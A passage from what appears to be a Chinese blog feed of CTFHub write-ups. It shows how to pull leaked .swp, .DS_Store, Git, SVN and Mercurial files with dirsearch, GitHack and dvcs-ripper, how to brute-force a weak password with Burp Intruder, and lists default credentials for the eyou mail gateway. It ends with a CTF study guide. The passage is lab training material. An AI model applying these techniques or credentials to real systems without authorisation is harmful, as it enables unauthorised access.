里面，URL 访问 <code>.index.php.swp</code> ,下载文件，记事本打开，<code>Ctrl+F</code> 搜索 <code>ctfhub</code> ，得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">4</span>a<span class="hljs-number">8</span>a<span class="hljs-number">5</span>a<span class="hljs-number">6827</span>ef<span class="hljs-number">58</span>eaa<span class="hljs-number">1</span>cb<span class="hljs-number">48</span>c<span class="hljs-number">7</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="4）-DS-Store"><a href="#4）-DS-Store" class="headerlink" title="4）.DS_Store"></a>4）.DS_Store</h3><h4 id="Methods-1"><a href="#Methods-1" class="headerlink" title="Methods 1"></a>Methods 1</h4><p>由题目可以得知，该题为 <code>DS_Store 文件泄露</code>  ，访问 <code>.DS_Store</code> ，下载文件 。使用 <code>.DS_Store</code> 的解析工具 <code>Python-dsstore</code> 进行文件的解析或者 <code>cat</code> 直接查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python main.py /root/桌面/DS_Store</span><br>Count:  1<br>74dcfc27bb26b65249468deab0aec8c1.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> cat /root/桌面/DS_Store</span><br>Bud1<br>······<br>DSDB@ @ @$74dcfc27bb26b65249468deab0aec8c1.txtnoteustr<br>flag here！<br></code></pre></td></tr></table></figure><p>发现一个文件，用 URL 访问 。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://challenge-d04c378688ecba9a.sandbox.ctfhub.com:10800/.DS_Store</span>      <span class="hljs-comment">#下载文件</span><br><span class="hljs-string">http://challenge-d04c378688ecba9a.sandbox.ctfhub.com:10800/74dcfc27bb26b65249468deab0aec8c1.txt</span>   <span class="hljs-comment">#URL 访问</span><br></code></pre></td></tr></table></figure><p>得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;aeeb<span class="hljs-number">8</span>c<span class="hljs-number">0</span>ba<span class="hljs-number">40</span>d<span class="hljs-number">9</span>cca<span class="hljs-number">11112094</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="Methods-2"><a href="#Methods-2" class="headerlink" title="Methods 2"></a>Methods 2</h4><p>使用 <code>.DS_Store文件</code> 解析工具 <code>ds_store_exp</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python ds_store_exp.py http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/.DS_Store</span><br>[200] http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/.DS_Store<br>[200] http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/e31117b96839e81d486c3966e76bf354.txt<br><br></code></pre></td></tr></table></figure><p>得到一个文件，用 URL 访问或直接打开查看，得到 flag 。</p><p>这里，题目直接告诉了我们是 <code>DS_Store 文件泄露</code>  ，如果没告诉，我们可以用 <code>dirsearch</code> 来把它扫出来 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br><br>Target: http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/<br><br>[22:24:06] Starting: <br>[22:24:10] 503 -  605B  - /.document<br><br>······<br><br>[22:24:10] 200 -   16KB - /.DS_Store<br><br>······<br><br>[22:25:57] 200 -  200B  - /index.html<br><br>Task Completed <br></code></pre></td></tr></table></figure><h2 id="4、Git泄露"><a href="#4、Git泄露" class="headerlink" title="4、Git泄露"></a>4、Git泄露</h2><h3 id="1）Log"><a href="#1）Log" class="headerlink" title="1）Log"></a>1）Log</h3><p>使用 <code>dirsearch</code> 进行扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-21144f4dddfed1c1.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br></code></pre></td></tr></table></figure><p>发现可能是 <code>.git泄露</code> ，使用 <code>GitHack</code> 进行处理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://challenge-58f241fad417e4d0.sandbox.ctfhub.com:10800/.git</span><br></code></pre></td></tr></table></figure><p>找到相应目录，使用 <code>git log</code> 查看历史记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git <span class="hljs-built_in">log</span></span><br>commit 9d5b583530f59c07fc62f457066d4ebd81db9782 (HEAD -&gt; master)<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    remove flag<br><br>commit 9b5b583530f59c07fc62f457066d4ebd81db9782<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    add flag<br><br>commit 9a5b583530f59c07fc62f457066d4ebd81db9782<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    init<br><br></code></pre></td></tr></table></figure><p>当前所处的版本为 <code>remove flag</code> ，<code>flag</code>  可能在 <code>add flag</code> 这次提交中，可以与 <code>add flag</code> 提交版本进行比对或者直接切换到 <code>add flag</code> 提交版本 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">//比较版本<br><span class="hljs-meta">#</span><span class="bash"> git diff 9b5b583530f59c07fc62f457066d4ebd81db9782</span><br>//切换版本<br><span class="hljs-meta">#</span><span class="bash"> git reset --hard 9b5b583530f59c07fc62f457066d4ebd81db9782</span><br></code></pre></td></tr></table></figure><p>比较版本可以直接得到 flag ，切换版本会得到几个文件，打开 <code>.txt</code> 文件，得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">107</span>f<span class="hljs-number">71</span>b<span class="hljs-number">7</span>e<span class="hljs-number">778</span>af<span class="hljs-number">3</span>f<span class="hljs-number">1</span>bbf<span class="hljs-number">4487</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="2）Stash"><a href="#2）Stash" class="headerlink" title="2）Stash"></a>2）Stash</h3><p>使用 <code>dirsearch</code> 进行扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-5d6ff60def13b410.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br></code></pre></td></tr></table></figure><p>发现可能是 <code>.git泄露</code> ，使用 <code>GitHack</code> 进行处理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://challenge-5d6ff60def13b410.sandbox.ctfhub.com:10800/.git</span><br></code></pre></td></tr></table></figure><p>找到相应目录，使用 <code>git log</code> 查看历史记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git <span class="hljs-built_in">log</span></span><br>commit 6de721fac74432123c67e910c3d6a3a65652d685 (HEAD -&gt; master)<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    remove flag<br><br>commit 58e73246189a7eb7756367821c193aaa6ffd369f<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    add flag<br><br>commit 6f2d3b79179d482bdb02514dfbe82f3a1f70a68b<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    init<br>    <br></code></pre></td></tr></table></figure><p>当前所处的版本为 <code>remove flag</code> ，<code>flag</code>  可能在 <code>add flag</code> 这次提交中，与 <code>add flag</code> 提交版本进行比对 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git diff 58e73246189a7eb7756367821c193aaa6ffd369f</span><br>diff --git a/2973298199238.txt b/2973298199238.txt<br>deleted file mode 100644<br>index e358b09..0000000<br>--- a/2973298199238.txt<br>+++ /dev/null<br>@@ -1 +0,0 @@<br>-where is flag<br><br>······<br><br></code></pre></td></tr></table></figure><p>比较版本发现变化是 <code>where is flag</code> 而不是 <code>flag</code> ，切换到 <code>add flag</code> 版本查看 <code>.txt</code> 文件，跟上面一样，猜测可能进行了更改，可以通过 <code>git stash pop</code> 命令恢复之前缓存的工作目录。</p><blockquote><p>这个指令将缓存堆栈中的第一个 stash 删除，并将对应修改应用到当前的工作目录下。也可以使用 <code>git stash apply</code> 命令，将缓存堆栈中的 stash 多次应用到工作目录中，但并不删除 stash 拷贝</p></blockquote><p>得到一个 <code>.txt</code> 文件，查看，得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">7419</span>cb<span class="hljs-number">6</span>a<span class="hljs-number">91</span>b<span class="hljs-number">581</span>d<span class="hljs-number">62470863</span>c&#125;<br></code></pre></td></tr></table></figure><h3 id="3）Index"><a href="#3）Index" class="headerlink" title="3）Index"></a>3）Index</h3><p>使用 <code>dirsearch</code> 进行扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-eb00a79e8f8033f0.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br></code></pre></td></tr></table></figure><p>发现可能是 <code>.git泄露</code> ，使用 <code>GitHack</code> 进行处理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://challenge-eb00a79e8f8033f0.sandbox.ctfhub.com:10800/.git</span><br></code></pre></td></tr></table></figure><p>找到相应目录，使用 <code>git log</code> 查看历史记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git <span class="hljs-built_in">log</span></span><br>commit f12bae0c5091515b7a628f4ce5164b277c8c05bd (HEAD -&gt; master)<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 14:00:53 2021 +0000<br><br>    add flag<br><br>commit a067ca223b652e73fa3e0705522c5d7ecb936ff7<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 14:00:53 2021 +0000<br><br>    init<br></code></pre></td></tr></table></figure><p>当前所处的版本为 <code>add flag</code> ，<code>flag</code>  可能就在此版本中 。重新切换到当前版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git reset --hard</span><br>HEAD 现在位于 f12bae0 add flag<br></code></pre></td></tr></table></figure><p>得到一个 <code>.txt</code> 文件，查看，得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">1152</span>c<span class="hljs-number">288321</span>eb<span class="hljs-number">80</span>b<span class="hljs-number">9</span>bc<span class="hljs-number">40</span>aa<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="5、SVN泄露"><a href="#5、SVN泄露" class="headerlink" title="5、SVN泄露"></a>5、SVN泄露</h2><p>题目显示：Flag 在服务端旧版本的源代码中 。</p><p>使用 <code>dirsearch</code> 进行扫描，发现可能是 <code>SVN泄露</code> ，使用 <code>dvcs-ripper</code> 进行处理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-svn.pl -v -u http://challenge-519d5d6873629d73.sandbox.ctfhub.com:10800/.svn/</span><br></code></pre></td></tr></table></figure><p>然后在工具的所在目录下生成了 <code>.svn</code> 文件夹，但是由于隐藏需要输入 <code>ls -al</code> 命令才能看到 。</p><p>使用 <code>tree</code> 命令查看 <code>.svn</code> 内的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> tree .svn/</span><br>.svn/<br>├── entries<br>├── format<br>├── pristine<br>│   ├── 96<br>│   │   └── 9615f4dee905fe62f578d91e3df23c7e3d294e15.svn-base<br>│   └── bf<br>│       └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base<br>├── text-base<br>├── tmp<br>├── wc.db<br>└── wc.db-journal<br><br>5 directories, 6 files<br></code></pre></td></tr></table></figure><p>猜测 <code>.svn/pristine</code> 里面存的是不同版本，<code>cat</code> 查看，在 <code>pristine/96/9615f4dee905fe62f578d91e3df23c7e3d294e15.svn-base</code> 中发现 flag ：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">372</span>c<span class="hljs-number">3</span>bfe<span class="hljs-number">29808</span>e<span class="hljs-number">2</span>a<span class="hljs-number">6</span>db<span class="hljs-number">76</span>c<span class="hljs-number">00</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="6、HG泄露"><a href="#6、HG泄露" class="headerlink" title="6、HG泄露"></a>6、HG泄露</h2><p>题目显示：Flag 在服务端旧版本的源代码中, 不太好使的情况下, 试着手工解决。</p><p>使用 <code>dirsearch</code> 进行扫描，发现可能是 <code>HG泄露</code> ，使用 <code>dvcs-ripper</code> 进行处理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-hg.pl -v -u http://challenge-fee1df107e428836.sandbox.ctfhub.com:10800/.hg/</span><br></code></pre></td></tr></table></figure><p>然后在工具的所在目录下生成了 <code>.hg</code> 文件夹，但是由于隐藏需要输入 <code>ls -al</code> 命令才能看到 。</p><p>使用 <code>tree</code> 命令查看 <code>.hg</code> 内的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> tree .hg/</span><br>.hg/<br>├── 00changelog.i<br>├── dirstate<br>├── last-message.txt<br>├── requires<br>├── store<br>│   ├── 00changelog.i<br>│   ├── 00manifest.i<br>│   ├── data<br>│   │   ├── 50x.html.i<br>│   │   └── index.html.i<br>│   ├── fncache<br>│   └── undo<br>├── undo.branch<br>├── undo.desc<br>├── undo.dirstate<br>└── wcache<br>    ├── checkisexec<br>    └── checknoexec<br><br>3 directories, 15 files<br></code></pre></td></tr></table></figure><p><code>cat</code> 查看 <code>.hg/store/fncache</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> cat .hg/store/fncache</span> <br>data/index.html.i<br>data/50x.html.i<br>data/flag_2225111905.txt.i<br></code></pre></td></tr></table></figure><p>发现 <code>.hg/store/data</code> 中应该有 <code>flag_2225111905.txt</code> ，但实际上却没有，加上题目提示，猜测可能没有抓取到，查看抓取过程得到验证 。</p><p>直接 URL 访问 <code>flag_2225111905.txt</code> 文件：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://challenge-fee1df107e428836.sandbox.ctfhub.com:10800/flag_2225111905.txt<br></code></pre></td></tr></table></figure><p>得到 flag ：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">79</span>b<span class="hljs-number">4</span>fe<span class="hljs-number">2881022888</span>ff<span class="hljs-number">2679</span>c<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Leakage</tag>
      
      <tag>Wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-密码口令</title>
    <link href="/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/"/>
    <url>/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>弱口令 (weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p><p>弱口令指的是仅包含简单数字和字母的口令，例如“123”、“abc”等，因为这样的口令很容易被别人破解，从而使用户的计算机面临风险，因此不推荐用户使用。</p><h2 id="1、弱口令"><a href="#1、弱口令" class="headerlink" title="1、弱口令"></a>1、弱口令</h2><p>进入题目页面，发现登录页面，先任意输入 <code>admin/admin</code> 进行登录尝试，发现不对。暂时没有其他线索，假设用户名就是 <code>admin</code>，然后进行暴力破解。</p><p>再次输入 <code>admin/admin</code> 进行登录尝试，进行抓包，得到字符串 <code>name=admin&amp;password=admin&amp;referer=</code> 。</p><p>接下来，对其进行暴力破解：</p><p>1）将报文发送到 <code>Intruder</code>，点击 <code>Positions</code>，将 <code>password=</code> 后面的 <code>admin</code> 添加为 <code>Payload Positions</code> 。</p><p>2）在 <code>Payloads</code> 选项卡下，选择 <code>Payload Type</code> 为 <code>Simple List</code>，然后在 <code>Payload Options</code> 中点击 <code>Load</code> 加载密码字典。</p><p>3）点击 <code>Start Attack</code> ，开始爆破，完成后按 <strong>Length</strong> 排序，发现一个长度不一样的 。</p><p>4）点击查看，点击 <code>Response</code>，得到 <code>flag</code> 。</p><h2 id="2、默认口令"><a href="#2、默认口令" class="headerlink" title="2、默认口令"></a>2、默认口令</h2><p>站点为 eyou 邮件网关，根据提示，在百度中搜索其默认用户名和密码 。</p><div class="table-container"><table><thead><tr><th>亿邮邮件网关</th><th>eyouuser</th><th>eyou_admin</th></tr></thead><tbody><tr><td></td><td>eyougw</td><td>admin@(eyou)</td></tr><tr><td></td><td>admin</td><td>±ccccc</td></tr><tr><td></td><td>admin</td><td>cyouadmin</td></tr></tbody></table></div><p>逐一尝试后得到正确的用户名/密码： <code>eyougw/admin@(eyou)</code> 。</p><p>访问成功后获得 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;c<span class="hljs-number">3</span>befbe<span class="hljs-number">8</span>d<span class="hljs-number">1</span>c<span class="hljs-number">39</span>fd<span class="hljs-number">66</span>fe<span class="hljs-number">4</span>e<span class="hljs-number">037</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Wp</tag>
      
      <tag>password</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF</title>
    <link href="/2021/08/04/CTF/CTF/"/>
    <url>/2021/08/04/CTF/CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF入门"><a href="#CTF入门" class="headerlink" title="CTF入门"></a>CTF入门</h1><h2 id="入门需要哪些基础："><a href="#入门需要哪些基础：" class="headerlink" title="入门需要哪些基础："></a>入门需要哪些基础：</h2><p>1、编程语言基础（C、汇编、脚本语言）<br>2、数学基础（算法、密码学）<br>3、脑洞大开（天马行空的想象、推理解密）<br>4、体力耐力（通宵熬夜）</p><h2 id="如何入门学"><a href="#如何入门学" class="headerlink" title="如何入门学"></a>如何入门学</h2><p>1、恶补基础知识<br>2、尝试从脑洞开始 如黑客game<br>4、学信息安全专业知识<br>5、锻炼体力耐力 周六日都有比赛</p><h2 id="到底如何学"><a href="#到底如何学" class="headerlink" title="到底如何学"></a>到底如何学</h2><p>1、分析赛题情况<br>2、分析自身能力 自己最适合哪个方向<br>3、选择更适合的入手</p><h2 id="分析赛题"><a href="#分析赛题" class="headerlink" title="分析赛题"></a>分析赛题</h2><p>PWN、Reverse 偏重对汇编、逆向的理解 对底层理解<br>Crypto 偏重对数学、算法的深入学习 密码课要深入学<br>Web 偏重对技巧沉淀、快速搜索能力的挑战 发散思维，对底层只需要了解，代码原理，关于漏洞点的积累<br>Misc 则更复杂，所有与计算机安全挑战有关的都在其中 隐写，图片数据分析还原，流量，大数据，对游戏分析逆向</p><h2 id="常规做法："><a href="#常规做法：" class="headerlink" title="常规做法："></a>常规做法：</h2><p>A方向：PWN+Reverse+Crypto随机搭配<br>B方向：Web+Misc组合<br>Misc所有人都可以做</p><h2 id="入门知识："><a href="#入门知识：" class="headerlink" title="入门知识："></a>入门知识：</h2><p>都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析</p><p>A方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等<br>B方向：Web安全、网络安全、内网渗透、数据库安全等 前10的安全漏洞</p><h2 id="推荐书："><a href="#推荐书：" class="headerlink" title="推荐书："></a>推荐书：</h2><p>A方向：</p><p>RE for Beginners<br>IDA Pro权威指南<br>揭秘家庭路由器0day漏洞挖掘技术<br>自己定操作系统<br>黑客攻防技术宝典：系统实战篇</p><p>B方向：</p><p>Web应用安全权威指南 最推荐小白，宏观web安全<br>Web前端黑客技术揭秘<br>黑客秘籍——渗透测试实用指南<br>黑客攻防技术宝典 web实战篇<br>代码审计：企业级web代码安全架构</p><h2 id="入门——从基础题目出发（推荐资源）"><a href="#入门——从基础题目出发（推荐资源）" class="headerlink" title="入门——从基础题目出发（推荐资源）"></a>入门——从基础题目出发（推荐资源）</h2><p><a href="http://ctf.idf.cn">http://ctf.idf.cn</a> !!!首推 idf实验室：题目非常基础，只1个点<br>www.ichunqiu.com 有线下决赛题目复现<br><a href="http://oj.xctf.org.cn/xctf">http://oj.xctf.org.cn/xctf</a> 题库网站，历年题，练习场，比较难<br>www.wechall.net/challs !!!!!!非常入门的国外ctf题库，很多国内都是从这里刷题成长起来的<br><a href="http://canyouhack.it/">http://canyouhack.it/</a> 国外，入门，有移动安全<br><a href="https://microcorruption.com/login">https://microcorruption.com/login</a> A方向 密码，逆向酷炫游戏代<br>http：//smashthestack.org A方向，简洁，国外，wargames，过关<br><a href="http://overthewire.ofg/wargames/">http://overthewire.ofg/wargames/</a> ！！！！推荐A方向 国内资料多，老牌wargame<br>https：//exploit-exercises.com A方向 老牌wargame，国内资料多<br><a href="http://pawnable.kr/play.php">http://pawnable.kr/play.php</a> pwn类游乐场，不到100题<br><a href="http://ctf.moonsoscom/pentest/index.php">http://ctf.moonsoscom/pentest/index.php</a> B方向 米安的Web漏洞靶场，基础，核心知识点<br>http：//prompt.ml/0 B方向 国外的xss测试<br><a href="http://redtiger.labs.overthewire.org/">http://redtiger.labs.overthewire.org/</a> B方向 国外sql注入挑战网站，10关，过关的形式 不同的注入，循序渐近地练习</p><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p><a href="https://github.com/truongkma/ctf-tools">https://github.com/truongkma/ctf-tools</a><br><a href="https://github.com/Plkachu/v0lt">https://github.com/Plkachu/v0lt</a><br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a><br><a href="https://github.com/TUCTF/Tools">https://github.com/TUCTF/Tools</a></p><h2 id="入门—以练促赛，以赛养练"><a href="#入门—以练促赛，以赛养练" class="headerlink" title="入门—以练促赛，以赛养练"></a>入门—以练促赛，以赛养练</h2><p>选择一场已经存在writeup的比赛</p><p>总结解题过程，分析出题人想法</p><p>参加一场最新的ctf比赛<br>https：//ctftime.org/ 国际比赛，有很多基础的<br>http：//www.xctf.org.cn/ 国内比赛，比较难</p><h2 id="组建团队—-强力成员画像"><a href="#组建团队—-强力成员画像" class="headerlink" title="组建团队—-强力成员画像"></a>组建团队—-强力成员画像</h2><p>1.思维跳跃：灵活性，不会钻墙脚<br>2.专注：遇到问题不放弃直到解决<br>3.耐力：连续一天研究技术<br>4.团队精神：责任、凝聚、分享</p><p>有3条为强力成员，有4条会成为强力队长！</p><p>总结自i春秋CTF入门指南</p><h1 id="CTF学习站点总结"><a href="#CTF学习站点总结" class="headerlink" title="CTF学习站点总结"></a>CTF学习站点总结</h1><h2 id="0x01-CTF-资讯"><a href="#0x01-CTF-资讯" class="headerlink" title="0x01 CTF 资讯"></a>0x01 CTF 资讯</h2><p>XCTF联赛：<a href="https://www.xctf.org.cn/">https://www.xctf.org.cn/</a></p><p>360安全客：<a href="http://bobao.360.cn/">http://bobao.360.cn/</a></p><p>CTF-TIME：<a href="https://ctftime.org/event/list/upcoming">https://ctftime.org/event/list/upcoming</a></p><p>CTF Rank：<a href="http://ctfrank.org/">http://ctfrank.org/</a></p><h2 id="0x02-CTF练习"><a href="#0x02-CTF练习" class="headerlink" title="0x02 CTF练习"></a>0x02 CTF练习</h2><h3 id="BIN"><a href="#BIN" class="headerlink" title="BIN:"></a>BIN:</h3><p>reversing</p><p><a href="https://link.zhihu.com/?target=http%3A//reversing.kr/">http://reversing.kr/</a></p><p>pwnable</p><p><a 